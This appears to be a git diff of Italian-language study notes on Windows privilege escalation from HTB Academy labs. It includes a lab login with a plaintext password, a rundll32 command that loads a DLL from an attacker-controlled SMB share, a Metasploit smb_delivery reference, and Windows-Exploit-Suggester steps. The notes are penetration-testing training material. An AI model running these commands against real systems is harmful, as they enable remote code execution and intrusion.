@@ -2,6 +2,7 @@
 
 Solitamente lo scopo di fare privesc su windows e' arrivare a utente **Local Administrator** o **NT AUTHORITY\SYSTEM**.
 COME CONNETTERSI AI LAB: **xfreerdp /v:<target ip> /u:htb-student**
+oppure: **rdesktop -u htb-student -p HTB_@cademy_stdnt! [IP Address]**
 
 ## Useful Tools
 | Tool                                     | Description                                                                                                                                                                                                       |
@@ -1617,3 +1618,28 @@ PS C:\htb> Find-AllVulns
 2) nella NOSTRA shell: `C:\htb> rundll32.exe \\10.10.14.3\lEUZam\test.dll`
 3) Spesso per runnare moduli di privesc(tipo msf6 exploit(windows/smb/smb_delivery) > search 2010-3338) dobbiamo **MIGRARE AD UN PROCESSO A 64bite**
 `
+# Windows Desktop Versions
+
+Windows 7 e' stato messo EOL il 14 gennaio 2020. ma si usa ancora molto
+
+## WIndows 7 vs newer versions
+
+| Feature                          | Windows 7 | Windows 10 |
+|----------------------------------|-----------|------------|
+| Microsoft Password (MFA)         |           | X          |
+| BitLocker                        | Partial   | X          |
+| Credential Guard                 |           | X          |
+| Remote Credential Guard          |           | X          |
+| Device Guard (code integrity)    |           | X          |
+| AppLocker                        | Partial   | X          |
+| Windows Defender                 | Partial   | X          |
+| Control Flow Guard               |           | X          |
+
+Si stima che ancora 100 milioni di utenti stanno usando Windows7.
+
+Su windows7 possiamo usare ancora **Sherlock** e **Windows-Exploit-Suggester**.
+
+
+## Windows-Exploit-Suggester
+1) Sulla macchina target runniamo `C:\htb> systeminfo`
+2) sulla nostra macchina `j4k1dibe@htb[/htb]$ python2.7 windows-exploit-suggester.py  --database 2021-05-13-mssb.xls --systeminfo win7lpe-systeminfo.txt ` 
